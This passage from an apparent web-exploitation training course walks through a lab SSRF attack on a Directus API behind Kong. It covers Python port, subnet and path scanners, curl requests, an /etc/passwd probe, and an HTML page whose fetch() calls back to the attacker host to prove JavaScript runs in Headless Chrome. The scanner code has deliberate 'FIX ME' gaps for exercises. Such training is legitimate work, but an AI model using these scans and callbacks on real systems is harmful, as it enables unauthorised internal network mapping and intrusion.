For the final part, we'll need a list of ports that we want to scan, using only common services and HTTP ports in this initial scan. We can always expand it later. For each port in our list, we want to send a request via the SSRF vulnerability and inspect the response body. Based on the response messages, we can infer if a port is open and what kind of service might be running on it.

ports = ['22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379','8000','8001','8055','8080','8443','9000']
timeout = float(args.timeout)

for p in ports:
    try:
        r = requests.post(url=args.target, json={"url":"{host}:{port}".format(host=args.ssrf,port=int(p))}, timeout=timeout)

        if args.verbose:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))

        if "You don't have permission to access this." in r.text:
            print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))
        elif "ECONNREFUSED" in r.text:
            print("{port:0} \t CLOSED".format(port=int(p)))
        elif "--------FIX ME--------" in r.text:
            print("{port:0} \t OPEN - returned 404".format(port=int(p)))
        elif "--------FIX ME--------" in r.text:
            print("{port:0} \t ???? - returned parse error, potentially open non-http".format(port=int(p)))
        elif "--------FIX ME--------" in r.text:
            print("{port:0} \t OPEN - socket hang up, likely non-http".format(port=int(p)))
        else:
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text))
    except requests.exceptions.Timeout:
        print("{port:0} \t timed out".format(port=int(p)))
Listing 29 - SSRF port scanner

Let's run the script and check for any other open ports on the server running the Directus APIs.

kali@kali:~$ ./ssrf_port_scanner.py -t http://apigateway:8000/files/import -s http://localhost --timeout 5
22       CLOSED
80       CLOSED
443      CLOSED
1433     CLOSED
1521     CLOSED
3306     CLOSED
3389     CLOSED
5000     CLOSED
5432     CLOSED
5900     CLOSED
6379     CLOSED
8000     CLOSED
8001     CLOSED
8055     OPEN - returned permission error, therefore valid resource
8080     CLOSED
8443     CLOSED
9000     CLOSED
Listing 30 - Port scan results

The scan results are not inspiring. We only scanned a handful of ports, but only port 8055 is open, which the web service is running on. The common services for connecting to a server, such as SSH and RDP, are either not present or not running on their normal ports. There are no common database ports open either. We are likely communicating with a microservice running in a container.1

Exercises
Complete the SSRF port scanner script, mapping error messages to port status.
Run the script against the Directus host.
Extra Mile
Modify the script to accept a list of IP addresses to scan as an argument.

1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/OS-level_virtualization ↩︎



##### Subnet Scanning with SSRF
According to its description, Directus is a platform for "managing the content of any SQL database".1 It is reasonable to expect that Directus will connect to a database server. Let's try using the SSRF vulnerability to scan for other targets on the internal network.

However, we don't know the IP address range the network uses. We can attempt to scan private IP ranges or use wordlists to brute force host names. Both approaches have some drawbacks.

If we attempt to brute force host names, we need to account for any extra latency introduced by DNS lookups on the victim machine. We also need a good wordlist for the host names.

On the other hand, there are three established ranges for private IP addresses.

IP address range	Number of addresses
10.0.0.0/8	16,777,216
172.16.0.0/12	1,048,576
192.168.0.0/16	65,536
Table 2 - Private IP addresses

Scanning an entire /8 or even a /12 network via SSRF could take several days. This is one area where we need to work smarter, not harder. Rather than scanning an entire subnet, we can try scanning for network gateways.2 Network designs commonly use a /16 or /24 subnet mask with the gateway running on the IP where the forth octet is ".1" (for example: 192.168.1.1/24 or 172.16.0.1/16). However, gateways can live on any IP address and subnets can be any size. In black box situations, we should start with the most common value.

As we noticed during our port scan, the Axios library will respond relatively quickly with ECONNREFUSED when a port is closed but the host is up.

kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:6666"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
Total: 178631 microseconds
Listing 31 - Timing a Connection to a Valid Host but Closed Port

A request to a closed port took 0.178631 seconds. However, If the host is not reachable, the server will take much longer and timeout.

kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://10.66.66.66"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
Total: 60155041 microseconds
Listing 32 - Timing a Connection to a Invalid Host

A request to an invalid host took 60.155041 seconds. We can assume that the timeout is configured to one minute. Using this information, we can deduce if an IP is valid or not, in a technique similar to an Nmap host scan.3 If we search for a gateway (assuming the gateway ends with ".1"), we can discover the subnet the containers are running on.

Depending on your version of curl, the time_total variable may be in seconds instead of the milliseconds output show above. The total values would display as 0.178631 and 60.155041 respectively.

We need to balance request timeouts for either approach. If we simply wait for the server to respond to every request, our scans will take longer than if we enforce a timeout in our script. However, we may overwhelm the server and get false negatives if our timeout value is too aggressive.

Let's copy ssrf_port_scanner.py into a new file named ssrf_gateway_scanner.py. We'll update the new script to scan subnets for default gateways and constrain our port scanning to a single port to reduce scan time. The port we decide to scan does not matter since we are only attempting to determine if the host is up. We can resume port scanning once we know the IP range used by the internal network.

Since we're scanning for default gateways, we will always use ".1" as the fourth octet of our payload. Since 10.0.0.0/8 networks and 172.16.0.0/12 will always have a static first octet, we will need two for loops to iterate through the possible values of the second and third octets.

Scanning the 192.168.0.0/16 network yielded no response so let's focus on the 172.16.0.0/12 network.

baseurl = args.target

base_ip = "http://172.{two}.{three}.1"
timeout = float(args.timeout)

for y in range(--------FIX ME--------,256):
    for x in range(1,256):
        host = base_ip.format(two=int(y), three=int(x))
        print("Trying host: {host}".format(host=host))
        try:
            r = requests.post(url=baseurl, json={"url":"{host}:8000".format(host=host)}, timeout=timeout)

Listing 33 - Updated section of ssrf_gateway_scanner.py

Let's run the script.

kali@kali:~$ ./ssrf_gateway_scanner.py -t http://apigateway:8000/files/import
Trying host: http://172.16.1.1
        8000     timed out
Trying host: http://172.16.2.1
        8000     timed out
...
Trying host: http://172.16.15.1
        8000     timed out
Trying host: http://172.16.16.1
        8000     OPEN - returned 404
Trying host: http://172.16.17.1
        8000     timed out
Listing 34 - Subnet scanning results

Excellent. We found a live IP address at 172.16.16.1. Let's kill the process. It may seem odd that a gateway has an open port but this may be an idiosyncrasy of the underlying environment. The important takeaway here is that it responded differently than the other IPs. Even a "connection refused" message would indicate we had found something interesting.

If you don't find any live hosts after a few minutes, consider re-running the script with a larger timeout value.

Exercises
Complete the gateway scanner script.
Run the script and detect a live gateway.
Extra Mile
Create a second script that enumerates based on host name. Try using the script to identify the live hosts.

1
(Monospace Inc, 2020), https://docs.directus.io/getting-started/introduction/ ↩︎

2
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Gateway_(telecommunications)#Network_gateway ↩︎

3
(Gordon "Fyodor" Lyon, 2015), https://nmap.org/book/man-host-discovery.html ↩︎


##### Host Enumeration
Now that we've identified a live IP address, let's copy our script to a new file named ssrf_subnet_scanner.py and modify it to scan just the subnet we previously identified for live IPs. It does not matter which port number we use in this scan. We can identify live hosts even if they refuse connections on the chosen port.

kali@kali:~$ ./ssrf_subnet_scanner.py -t http://apigateway:8000/files/import --timeout 5
Trying host: 172.16.16.1
        8000     OPEN - returned 404
Trying host: 172.16.16.2
        8000     OPEN - returned 404
Trying host: 172.16.16.3
        8000     Connection refused, could be live host
Trying host: 172.16.16.4
        8000     Connection refused, could be live host
Trying host: 172.16.16.5
        8000     Connection refused, could be live host
Trying host: 172.16.16.6
        8000     Connection refused, could be live host
Trying host: 172.16.16.7
        8000     {"errors":[{"message":"connect EHOSTUNREACH 172.16.16.7:8000","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
Trying host: 172.16.16.8
        8000     {"errors":[{"message":"connect EHOSTUNREACH 172.16.16.8:8000","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
Listing 35 - Subnet scanning results

We can kill the script once we start receiving multiple "EHOSTUNREACH" errors. A quick Google search indicates this error message might mean the host couldn't find a route to a given IP address. Since we have several live hosts to work with, we can ignore any IP addresses that resulted in the "EHOSTUNREACH" error.

If you don't find any live hosts, re-run the script with a larger timeout value.

Based on the response values, we can assume the first six hosts are valid. Let's modify the script to scan for common ports on those hosts, using the same list of ports found in Listing 28. We can limit the amount of extraneous data by filtering "connection refused" messages.

kali@kali:~$ ./ssrf_subnet_scanner.py -t http://apigateway:8000/files/import --timeout 5
Trying host: 172.16.16.1
        22       ???? - returned parse error, potentially open non-http
        8000     OPEN - returned 404
Trying host: 172.16.16.2
        8000     OPEN - returned 404
        8001     OPEN - returned permission error, therefore valid resource
Trying host: 172.16.16.3
        5432     OPEN - socket hang up, likely non-http
Trying host: 172.16.16.4
        8055     OPEN - returned permission error, therefore valid resource
Trying host: 172.16.16.5
        9000     OPEN - returned 404
Trying host: 172.16.16.6
        6379     ???? - returned parse error, potentially open non-http
Listing 36 - Subnet scanning results

These results are promising. We know the Kong API Gateway is running on 8000. This port is open on the first two hosts. Kong runs its Admin API on port 8001, restricted to localhost. Since 172.16.16.2 has ports 8000 and 8001 open, we can assume that it is running the Kong API Gateway. The host on 172.16.16.1 is likely the network gateway or an external network interface.

This environment should always have six hosts but the IP assigned to each host might vary. Reverting the VM can also reassign the hosts' IP addresses.

The default port for Directus is 8055, which aligns with host four. Port 5432 is the default port for PostgreSQL. Port 6379 is the default port for REDIS. Using this information, we now have a better picture of the internal network.

Figure 4: Updated network diagram
Figure 4: Updated network diagram
We still have one host running an unknown HTTP service on port 9000. However, the SSRF vulnerability allows us to verify which backend servers are hosting the public endpoints we have identified.


##### Render API Auth Bypass
We discovered the /render service during our initial enumeration. However, the service required authentication via the API gateway. Developers sometimes rely on a gateway or reverse proxy to handle authentication or restrict access to an API. Perhaps we can use the SSRF to bypass the API gateway and call the render service directly.

However, we first need to figure out which backend server is hosting the render service. It doesn't seem like the render service is running on the Directus host, so we will turn our attention to the host with the unknown service on port 9000. Let's use the SSRF vulnerability to check if http://172.16.16.3:9000/render is valid.

kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/render"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
Date: Thu, 25 Feb 2021 16:59:49 GMT
X-Kong-Upstream-Latency: 33
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
Listing 37 - Searching for /render

Unfortunately, our request failed to find a valid resource. We need to consider that the URL of the backend service might not match the URL the API gateway exposes. For example, the backend URL could include versioning. Perhaps we can do some more fuzzing and inspect response codes to find the backend service.

First, we'll need to build a short wordlist with potential URLs.

/
/render
/v1/render
/api/render
/api/v1/render
Listing 38 - Contents of paths.txt

After modifying one of our existing scripts, we'll run it.

kali@kali:~$ ./ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000 -p paths.txt --timeout 5
/                 OPEN - returned 404
/render           OPEN - returned 404
/v1/render        OPEN - returned 404
/api/render       {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
/api/v1/render    OPEN - returned 404
Listing 39 - Checking for possible paths

We received one interesting response: "Request failed with status code 400". An HTTP 400 Bad Request usually indicates that the server cannot process a request due to missing data or a client error. What might we be missing from our request? What could the render service do? We only know the name and it isn't very descriptive. Let's suppose it draws or creates something. How might we provide data to it?

Let's put together a list of potential parameter names and values. There are plenty of wordlists of parameter names available online.1 Let's start with a smaller list of values that seem relevant. We can always expand to a larger list if we need to. We'll include our Kali host in any potential URL or link field so we can watch for working requests.

?data=foobar
?file=file:///etc/passwd
?url=http://192.168.118.3/render/url
?input=foobar
?target=http://192.168.118.3/render/target
Listing 40 - Contents of paths2.txt

Even if we don't have a valid parameter or value, perhaps we can still generate an error on the render service that would give us a clue as to our next step. When we are operating in an unknown environment or with an unfamiliar system, we sometimes have to rely on small differences in server responses, such as error messages, to infer what is happening in the unknown application.

Let's try running this new wordlist through our script, making sure to update the SSRF target value to the new URL.

kali@kali:~$ ./ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000/api/render -p paths2.txt --timeout 5
?data=foobar     {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
?file=file:///etc/passwd         {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
?url=http://192.168.118.3/render/url    OPEN - returned permission error, therefore valid resource
?input=foobar    {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
?target=http://192.168.118.3/render/target      {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
Listing 41 - Running enumeration with paths2.txt

It seems the url parameter was a valid request based on the permission error message. Let's check if it actually connected back to our Kali host.

kali@kali:~$ sudo tail /var/log/apache2/access.log
...
192.168.120.135 - - [25/Feb/2021:12:09:35 -0500] "GET /render/url HTTP/1.1" 404 492 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
Listing 42 - Apache access.log contents

Not only did we receive a request from the render service, Headless Chrome2 made the request.

Exercises
Using the scripts created so far as a base, create the SSRF path scanner script.
Run the script as detailed in this section and verify the render service can connect back to your Kali VM.
1
(Daniel Miessler, et al, 2017),https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt ↩︎

2
(Google, 2021), https://developers.google.com/web/updates/2017/04/headless-chrome ↩︎

##### Exploiting Headless Chrome
When we exploited the SSRF in the Directus Files API, the user agent was axios. Now that we can call the Render API through the SSRF vulnerability, we can make an instance of Headless Chrome access a URL of our choice. Initially, this might seem like another SSRF vulnerability but Headless Chrome is essentially a full browser without a UI. The headless browser should still execute any JavaScript functions as it loads a web page. If it does, we have the ability to run arbitrary JavaScript from the browser that is running on the remote server, which would give us the ability to extract data from other internal pages or services, send POST requests, and interact with the other internal resources in many different ways.

Before we get ahead of ourselves, let's verify the headless browser will execute JavaScript. We will create a simple HTML page with a JavaScript function that runs on page load.

<html>
<head>
<script>
function runscript() {
    fetch("http://192.168.118.3/itworked");
}
</script>
</head>
<body onload='runscript()'>
<div></div>
</body>
</html>
Listing 43 - Contents of hello.html

Since the application does not return the page loaded with the SSRF vulnerability, we need another way to determine if the browser executes JavaScript. Our JavaScript function uses fetch() to make a call back to our Kali host. The onload event in the body tag calls our function. After placing this file in our webroot, let's use the SSRF vulnerability to call the render service pointed at this file.

kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.118.3/hello.html"}' http://apigateway:8000/files/import
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
Date: Thu, 25 Feb 2021 18:14:42 GMT
X-Kong-Upstream-Latency: 1555
X-Kong-Proxy-Latency: 2
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
Listing 44 - Calling render with our html file

Since we received a "forbidden" response, the browser should have loaded our HTML page. Let's check our Apache access log for the callback.

kali@kali:~/Documents/awae$ sudo tail /var/log/apache2/access.log
...
192.168.120.135 - - [25/Feb/2021:13:14:41 -0500] "GET /hello.html HTTP/1.1" 200 483 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.120.135 - - [25/Feb/2021:13:14:41 -0500] "GET /itworked HTTP/1.1" 404 491 "http://192.168.118.3/hello.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
Listing 45 - Checking Apache access.log

We have two new entries in access.log. The first lists the hello.html file that we used in the call to the Render API. The second entry is from the JavaScript function. We have verified we can execute JavaScript in the Headless Chrome browser.

Let's review the attack chain.

Figure 5: SSRF Attack Chain
Figure 5: SSRF Attack Chain
We started the attack by sending a request with curl. The Kong API Gateway proxies our request to the Files service endpoint on the Directus host. The Directus application takes the value of the url parameter and sends a GET request to that URL. We specified the Render service endpoint so the Directus application sends the GET request there. The Render service handles the GET request and reads the url parameter out of the URL and sends a GET request to that URL using Headless Chrome. The browser loads the HTML page from our Kali host and executes the JavaScript, which makes a second GET request to our Kali host.

The Render service returns its results to the File service. The File service returns the HTTP 403 Forbidden response because we are not authenticated.

Exercise
Repeat the steps above and execute JavaScript in the Headless Chrome browser.


